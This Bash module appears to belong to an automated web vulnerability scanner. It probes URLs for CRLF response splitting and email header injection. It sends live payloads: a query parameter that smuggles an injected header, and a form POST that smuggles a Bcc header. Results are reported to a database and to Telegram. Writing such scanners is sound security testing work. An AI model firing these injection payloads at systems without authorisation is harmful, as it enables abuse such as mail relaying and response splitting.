#!/usr/bin/env bash
# modules/54_crlf_email.sh — Tier 3.8 CRLF + email header injection
MODULE_NAME="crlf_email"
MODULE_DESC="CRLF + email header injection — Bcc, response splitting"

_ce_finding() {
  db_add_finding "$1" "crlf_email" "$5" "$3" "$4" "$6" "${7:-medium}" 2>/dev/null
  log_warn "  ⚡ [$5/${7:-medium}] CRLF/Email $4: $3"
  if [[ "${7:-medium}" != "low" ]] && [[ "$5" == "critical" || "$5" == "high" ]]; then
    _telegram_send "🟠 *CRLF/Email — $4*
🌐 \`$2\` 🔗 \`$3\`
📋 ${6:0:250}
📊 \`${5^^}\`/\`${7:-medium}\`" 2>/dev/null || true
  fi
}

_ce_probe() {
  local URL="$1" DOMAIN_ID="$2" DOMAIN="$3"
  local CANARY="HACKDR_CRLF_$(openssl rand -hex 4)"

  # Test 1: HTTP response splitting (CRLF en query params)
  # Anti-FP fix 2026-05-10: el header inyectado debe aparecer como header SEPARADO
  # (línea propia comenzando con X-Hackeadora-Injected:), NO como substring dentro
  # del valor de otro header (e.g. Location: ...?ref=...%0d%0aX-Hackeadora-Injected:...)
  # cuando el server solo refleja la query sin decode.
  local TEST_URL="${URL%%\?*}?ref=test%0d%0aX-Hackeadora-Injected:%20${CANARY}"
  _h_get_noredirect "$TEST_URL" --connect-timeout 6
  # grep con ^ anclado a inicio de línea (header propio)
  if echo "$HTTP_LAST_HEADERS" | grep -qiE '^X-Hackeadora-Injected:[[:space:]]*'"${CANARY}"; then
    _ce_finding "$DOMAIN_ID" "$DOMAIN" "$URL" "crlf_response_splitting" "high" \
      "CRLF response splitting confirmado: param 'ref' inyecta header X-Hackeadora-Injected como header separado en respuesta (CRLF real procesado)." \
      "high"
    return 0
  fi

  # Test 2: Email header injection en POST forms (signup/contact/reset)
  # Solo probar si el path indica form de email
  if echo "$URL" | grep -qiE '/(contact|signup|register|forgot|reset|invite|subscribe)'; then
    local PAYLOAD="email=victim%40target.com%0d%0aBcc%3A%20${CANARY}%40hackeadora-canary.invalid&name=test&message=test"
    _h_post_noredirect "${URL%%\?*}" "$PAYLOAD" --connect-timeout 8 \
      -H "Content-Type: application/x-www-form-urlencoded"
    local STATUS="$HTTP_LAST_STATUS"
    local BODY="${HTTP_LAST_BODY:0:1500}"
    # Si responde 200/302 con success, posible Bcc injection (verificar OOB para confirmar)
    if [[ "$STATUS" =~ ^(200|201|302)$ ]] && \
       echo "$BODY" | grep -qiE '"success"|"sent"|"thank"|"received"' && \
       ! echo "$BODY" | grep -qiE '"error"|"invalid email"|"forbidden"'; then
      _ce_finding "$DOMAIN_ID" "$DOMAIN" "$URL" "email_bcc_injection_unverified" "medium" \
        "Endpoint email con possible Bcc injection: payload con %0d%0aBcc:... aceptado (status $STATUS, success). Verificar OOB con email canary." \
        "medium"
    fi
  fi
  return 1
}

module_run() {
  local DOMAIN="$1" DOMAIN_ID="$2" OUT_DIR="$3"
  log_phase "Módulo 54 — $MODULE_DESC: $DOMAIN"
  source "${SCRIPT_DIR}/core/http_analyzer.sh" 2>/dev/null
  local CANDIDATES
  CANDIDATES=$(sqlite3 "$DB_PATH" "
    SELECT DISTINCT url FROM urls
    WHERE domain_id=${DOMAIN_ID}
      AND (url LIKE '%/contact%' OR url LIKE '%/signup%' OR url LIKE '%/register%'
           OR url LIKE '%/forgot%' OR url LIKE '%/reset%' OR url LIKE '%/invite%'
           OR url LIKE '%/subscribe%' OR url LIKE '%?ref=%' OR url LIKE '%?redirect=%'
           OR url LIKE '%?next=%' OR url LIKE '%?return=%')
    LIMIT 15;" 2>/dev/null | sort -u)
  [[ -z "$CANDIDATES" ]] && { log_info "  Sin endpoints CRLF/email candidatos"; return 0; }
  local TOTAL=0
  while IFS= read -r URL; do
    [[ -z "$URL" ]] && continue
    _ce_probe "$URL" "$DOMAIN_ID" "$DOMAIN" && ((TOTAL++))
  done <<< "$CANDIDATES"
  log_ok "$MODULE_DESC: $TOTAL"
}
